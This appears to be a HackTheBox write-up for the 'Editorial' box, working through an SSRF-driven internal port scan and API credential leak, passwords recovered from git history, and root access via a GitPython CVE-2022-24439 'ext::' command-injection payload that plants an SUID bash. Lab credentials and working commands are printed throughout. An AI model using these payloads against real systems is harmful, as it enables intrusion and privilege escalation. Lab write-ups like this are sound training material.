# HTB: Editorial

![](https://img.shields.io/badge/OS-Linux-blue)
![](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![](https://img.shields.io/badge/Status-Retired-green)
![](https://img.shields.io/badge/CVE-2022--24439-high)

**Tags:** `ssrf` `internal-api-enumeration` `credential-leak` `git-history` `lateral-movement` `gitpython` `cve-2022-24439` `sudo-abuse` `supply-chain`

---

## Overview

Editorial is an Easy-rated Linux box centered around a publishing web application. The initial foothold abuses a Server-Side Request Forgery (SSRF) vulnerability in a book cover upload endpoint — by supplying a URL pointing to internal addresses, the server fetches and returns internal API responses. Enumerating the internal API on `127.0.0.1:5000` reveals a `/api/latest/metadata/messages/authors` endpoint that leaks SSH credentials for the `dev` user. After gaining a shell, Git commit history on a local repository exposes credentials for a second user (`prod`). Privilege escalation exploits CVE-2022-24439, a critical vulnerability in the `gitpython` library, via a `sudo`-allowed Python script that performs a `git clone` — the `ext::` protocol handler allows injecting arbitrary shell commands into the clone URL.

### Attack Path

```
[Recon]
  nmap → port 22 (SSH), port 80 (nginx → editorial.htb)
       ↓
[Phase 1 — SSRF → Internal API]
  /upload-cover endpoint accepts bookurl parameter
  → server fetches the URL server-side
  → SSRF to 127.0.0.1:5000 → internal API discovered
  → GET /api/latest/metadata/messages/authors
  → credentials: dev:dev080217_devAPI!@
  → SSH as dev
       ↓
[Phase 2 — Git History → Lateral Movement]
  /home/dev/apps → git repository
  → git log → b73481b commit by prod user
  → git show b73481b → prod:080217_Producti0n_2023!@
  → su prod (or SSH as prod)
       ↓
[Phase 3 — CVE-2022-24439 → Root]
  sudo -l → prod can run clone_prod_change.py as root
  /opt/internal_apps/clone_changes/clone_prod_change.py
  → calls git.Repo.clone_from(url, ...) via gitpython
  → ext:: protocol handler executes shell commands
  → payload: ext::sh -c 'cp /bin/bash /tmp/rootbash && chmod 4777 /tmp/rootbash'
  → sudo python3 clone_prod_change.py 'ext::...'
  → /tmp/rootbash -p → uid=0(root)
```

---

## Enumeration

### Nmap

```
$ sudo nmap -sC -sV -p- --min-rate 5000 -oA nmap/editorial 10.129.12.21

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 redirects to `editorial.htb` — add to `/etc/hosts`:

```bash
echo "10.129.12.21 editorial.htb" | sudo tee -a /etc/hosts
```

### Web Application

The site is a book publishing platform with two notable pages:

- `/` — homepage, static
- `/upload` — "Publish with Us" form accepting a book title, synopsis, and a **cover image URL** (`bookurl` parameter)

The cover image field accepts a URL and the server fetches it server-side — an immediate SSRF candidate.

---

## Phase 1 — SSRF → Internal API Enumeration

### Confirming SSRF

Submitting a URL pointing to our listener confirms server-side fetching:

```bash
# Start listener
nc -lvnp 8000

# Submit via curl
curl -s -X POST http://editorial.htb/upload-cover \
  --form "bookurl=http://10.10.14.X:8000/test" \
  --form "bookfile=@/dev/null;type=application/octet-stream"
```

The server reaches out to our listener — SSRF confirmed.

### Why This Happens

The application takes a user-supplied URL and performs an HTTP request from the server without validating whether the target is internal or external. This allows an attacker to use the server as a proxy to reach services that are not exposed to the internet — in this case, an internal API running on localhost.

### Internal Port Scanning via SSRF

With SSRF confirmed, the next step is to enumerate what's listening internally. Testing `127.0.0.1` on common ports:

```bash
# Fuzz internal ports — different response length = open port
for port in $(seq 1 10000); do
  resp=$(curl -s -o /dev/null -w "%{size_download}" -X POST http://editorial.htb/upload-cover \
    --form "bookurl=http://127.0.0.1:${port}" \
    --form "bookfile=@/dev/null;type=application/octet-stream")
  if [ "$resp" != "61" ]; then
    echo "[+] Port $port open (response size: $resp)"
  fi
done
```

```
[+] Port 5000 open (response size: 51)
```

Port 5000 returns a different response — something is listening internally.

### Enumerating the Internal API

Fetching `http://127.0.0.1:5000` via SSRF returns a path:

```bash
curl -s -X POST http://editorial.htb/upload-cover \
  --form "bookurl=http://127.0.0.1:5000" \
  --form "bookfile=@/dev/null;type=application/octet-stream"
```

Response points to: `static/uploads/<uuid>` — download it:

```bash
curl -s http://editorial.htb/static/uploads/<uuid>
```

```json
{
  "messages": [
    {"promotions": "/api/latest/metadata/messages/promotions"},
    {"authors": "/api/latest/metadata/messages/authors"},
    {"how_to_use_platform": "/api/latest/metadata/messages/how_to_use_platform"}
  ],
  "version": "1.0.0"
}
```

Internal API discovered. Fetching the `authors` endpoint:

```bash
curl -s -X POST http://editorial.htb/upload-cover \
  --form "bookurl=http://127.0.0.1:5000/api/latest/metadata/messages/authors" \
  --form "bookfile=@/dev/null;type=application/octet-stream"
# → download the returned UUID path
curl -s http://editorial.htb/static/uploads/<uuid>
```

```json
{
  "template_mail_message": "Hey there! This is the template ...",
  "dev_mail": "dev@editorial.htb",
  "credentials": {
    "prod": "prod@editorial.htb",
    "dev": "dev080217_devAPI!@"
  }
}
```

Credentials leaked: `dev:dev080217_devAPI!@`

### SSH as dev

```
$ ssh dev@editorial.htb
dev@editorial:~$ id
uid=1000(dev) gid=1000(dev) groups=1000(dev)

dev@editorial:~$ cat user.txt
<flag>
```

---

## Phase 2 — Git History → Lateral Movement to prod

### Discovering the Repository

```
dev@editorial:~$ ls apps/
README.md
dev@editorial:~$ cd apps && git log --oneline
```

```
b73481b Change(whoops) no more credentials as code
1e84de2 Initial commit
```

The commit message "whoops no more credentials as code" is a strong signal — credentials were committed and then removed.

### Extracting Credentials from Git History

```bash
dev@editorial:~/apps$ git show b73481b
```

```diff
-        'credentials': {
-            'prod': 'prod@editorial.htb',
-            'prod_password': '080217_Producti0n_2023!@'
-        }
```

Credentials for `prod`: `080217_Producti0n_2023!@`

### Why Deleted Files Stay in Git

`git rm` removes a file from the working tree but the commit containing the original content remains permanently in history unless the repo is explicitly rewritten (`git filter-branch` or `git filter-repo`). Secrets committed to Git — even briefly — should be treated as compromised and rotated immediately.

```bash
dev@editorial:~$ su prod
Password: 080217_Producti0n_2023!@

prod@editorial:/home/dev$ id
uid=1001(prod) gid=1001(prod) groups=1001(prod)
```

---

## Phase 3 — CVE-2022-24439 (GitPython) → Root

### Sudo Permissions

```
prod@editorial:~$ sudo -l

User prod may run the following commands on editorial:
    (root) NOPASSWD: /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

### Analysing the Script

```python
# /opt/internal_apps/clone_changes/clone_prod_change.py
import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

The script calls `git.Repo.clone_from()` with a user-controlled URL and the option `protocol.ext.allow=always`. This is the exact condition required for CVE-2022-24439.

### CVE-2022-24439 — GitPython ext:: Protocol Injection

GitPython passes the URL directly to the underlying `git` binary without sanitisation. Git's `ext::` protocol handler executes an arbitrary shell command as the transport mechanism. With `protocol.ext.allow=always` explicitly set, the ext protocol is permitted for all operations.

**Payload:**

```bash
# Step 1: Create the shell payload
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4777 /tmp/rootbash' > /tmp/pwn.sh
chmod +x /tmp/pwn.sh

# Step 2: Trigger the exploit
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py \
  'ext::sh -c /tmp/pwn.sh& '

# Step 3: Execute root shell
/tmp/rootbash -p
```

```
rootbash-5.1# id
uid=1001(prod) gid=1001(prod) euid=0(root) egid=0(root)

rootbash-5.1# cat /root/root.txt
<flag>
```

---

## Flags

```
user.txt  →  [obtained via SSH as dev]
root.txt  →  [obtained via CVE-2022-24439 as root]
```

---

## What I Learned

**SSRF for Internal Service Discovery**
The `bookurl` parameter was the only obvious attack surface — no SQLi, no file upload bypass needed. The key insight was recognising that any server-side URL fetch can be redirected to internal addresses. Systematically fuzzing internal ports via SSRF response size differences is a reliable enumeration technique when direct network access isn't available.

**Never Trust the Response Size Alone**
The SSRF detection used response size as a differentiator. On real engagements, response time differences (timing-based SSRF) can be equally useful when response bodies are uniform — worth keeping in mind for blind SSRF scenarios.

**Git History as a Credential Store**
The `b73481b` commit is a textbook example of why "I'll just delete it in the next commit" is not a security fix. On real assessments, checking `git log` and `git show` on any discovered repository is always worth the thirty seconds it takes. Tools like `trufflehog` and `gitleaks` automate this at scale.

**Supply Chain Risk: Vulnerable Dependencies**
CVE-2022-24439 is a critical vulnerability in `gitpython` — a widely-used Python library. The root cause is insufficient input validation when passing a URL to an underlying system binary. This is a supply chain risk: the application code itself (`clone_prod_change.py`) looks reasonable, but the library it calls is the weak link. Keeping dependencies patched and audited is non-negotiable.

**sudo + Third-Party Libraries = High Risk**
The combination of `sudo NOPASSWD` and a script that calls an external library with user-controlled input is almost always exploitable. During real engagements, `sudo -l` should always be checked, and any allowed script should be read in full — not just for obvious command injection but also for library-level vulnerabilities like this one.

---

## References

- [CVE-2022-24439 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-24439)
- [GitPython ext:: Protocol — GitHub Advisory](https://github.com/advisories/GHSA-hcpj-qp55-gfph)
- [SSRF — PortSwigger](https://portswigger.net/web-security/ssrf)
- [Secrets in Git History — GitGuardian](https://blog.gitguardian.com/secrets-credentials-api-git/)
- [HackTheBox — Editorial](https://www.hackthebox.com/machines/editorial)
